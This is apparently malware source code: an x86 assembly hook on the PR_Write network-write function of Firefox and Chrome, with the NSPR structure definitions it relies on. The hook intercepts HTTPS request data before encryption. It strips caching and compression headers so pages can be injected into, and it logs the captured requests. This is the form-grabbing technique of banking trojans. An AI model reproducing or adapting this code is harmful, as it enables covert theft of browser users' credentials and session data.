
.code

;; ==================================================================================================== ;;
;; hPR_Write is a PR_Write handler procedure of Firefox & Chrome browsers                               ;;
;; ==================================================================================================== ;;
hPR_Write proc p1, p2, p3 : dword

	mov  eax, p1	;; PRFileDesc
	mov  eax, [eax]	;; PRIOMethods
	mov  eax, [eax]	;; PRDescType

	cmp  eax, 2		;; PR_DESC_FILE       = 1
	je   @F			;; PR_DESC_SOCKET_TCP = 2
	cmp  eax, 4		;; PR_DESC_SOCKET_UDP = 3
	je   @F			;; PR_DESC_LAYERED    = 4


@real:
	GetBaseDelta eax
	invokx  _PR_Write[eax], p1, p2, p3
	add  esp, 12
	leave
	retn


@@:	pushad
	GetBaseDelta ebx
	invokx  &GrabBrief[ebx], p1, p2, p3
	jmpz eax, @real		;; headers not grabbed


;; ================================================== ;;
;; modify headers only if inject needed
	invokx  &GetInject[ebx], p1, 0
	jmpz eax, @varswork	;; not modify


	invokx  &StrIPos[ebx], p2, p3, "\r\nIf-Modified-Since: ", 21
	jmpz eax, @F		;; not found
	add  eax, 21
	invokx  &strcpyn[ebx], eax, "Thu, 01 Jan 1970 00:00:00 GMT", 29


@@:	invokx  &StrIPos[ebx], p2, p3, "\r\nAccept-Encoding: ", 19
	jmpz eax, @varswork	;; not found
	lea  edi, [eax+19]
	mov  eax, p2
	add  eax, p3
	sub  eax, edi
	invokx  &StrIPos[ebx], edi, eax, "\r\n", 2
	mov  ecx, eax
	invokx  &strcpyn[ebx], edi, "identity", 8
	add  edi, 8
	sub  ecx, edi
	mov  al, " "
	rep  stosb


@varswork:
;; ================================================== ;;
;; grab vars from contents


;; ================================================== ;;
;; delete vars from contents
comment ~
	invokx  &StrIPos[ebx], p2, p3, "display=", 8
	jmpz eax, @write
	mov  edi, eax
	mov  eax, p2
	add  eax, p3
	sub  eax, edi
	invokx  &StrIPos[ebx], edi, eax, "&", 1
	mov  ecx, eax
	sub  ecx, edi
	mov  al, "&"
	rep  stosb
~





;; ================================================== ;;
@write:
popad

	GetBaseDelta eax
	invokx  _PR_Write[eax], p1, p2, p3
	add  esp, 12
	jmple eax, @1	;; grab only success requests

pushad
	mov  ecx, eax	;; save send len
	GetBaseDelta ebx
	invokx  &IsGrabTerm[ebx], p1
	jmpz eax, @F
	invokx  &InLog[ebx], p2, ecx, HTTPS_REQUEST
@@:
popad

@1:	leave
	retn
hPR_Write endp


comment ~

PRInt32 PR_Write(
  PRFileDesc *fd,
  const void *buf,
  PRInt32 amount);


struct PRFileDesc {
  PRIOMethods *methods;
  PRFilePrivate *secret;
  PRFileDesc *lower, *higher;
  void (*dtor)(PRFileDesc *fd);
  PRDescIdentity identity;
};

typedef struct PRFileDesc PRFileDesc;


struct PRIOMethods {
  PRDescType file_type;
  PRCloseFN close;
  PRReadFN read;
  PRWriteFN write;
  PRAvailableFN available;
  PRAvailable64FN available64;
  PRFsyncFN fsync;
  PRSeekFN seek;
  PRSeek64FN seek64;
  PRFileInfoFN fileInfo;
  PRFileInfo64FN fileInfo64;
  PRWritevFN writev;
  PRConnectFN connect;
  PRAcceptFN accept;
  PRBindFN bind;
  PRListenFN listen;
  PRShutdownFN shutdown;
  PRRecvFN recv;
  PRSendFN send;
  PRRecvfromFN recvfrom;
  PRSendtoFN sendto;
  PRPollFN poll;
  PRAcceptreadFN acceptread;
  PRTransmitfileFN transmitfile;
  PRGetsocknameFN getsockname;
  PRGetpeernameFN getpeername;
  PRGetsockoptFN getsockopt;
  PRSetsockoptFN setsockopt;
};

typedef struct PRIOMethods PRIOMethods;

~

